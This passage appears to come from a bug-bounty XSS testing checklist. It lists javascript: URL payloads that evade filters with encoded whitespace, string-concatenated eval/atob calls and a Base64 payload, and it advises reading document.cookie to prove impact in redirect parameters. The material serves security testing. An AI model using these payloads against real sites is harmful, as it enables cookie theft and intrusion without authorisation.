...
# Tab/newline/CR in URL (browser ignores whitespace, splits the literal javascript: token):
java%09script:alert(1)
java%0dscript:window[`ev`%2b`al`](window[`at`%2b`ob`](`ZG9jdW1lbnQud3JpdGUoYWxlcnQoMSkp`))
java%0dscript:window[`ale`%2b`rt`](1)
# %0d/%0a/%09 all split the token; %2b is +; backticks concatenate arbitrary keywords (ev+al / at+ob / ale+rt). Probe scheme execution with a concatenated alert first; for an SRC write-up switch to document.write(document.cookie) or its Base64 form
```
...
□ Test JavaScript sink: ?url=javascript:alert(1) / ?backUrl=javascript%3Adocument.write(document.cookie)
  (If the literal javascript: is filtered, change the colon to %3A. Prove impact with document.write(document.cookie), not just alert(1).
  Only front-end sinks such as location.href / <a href> assignment execute it; a javascript: value in an HTTP 302 Location header is generally not run by browsers — that is merely an open redirect, not XSS)
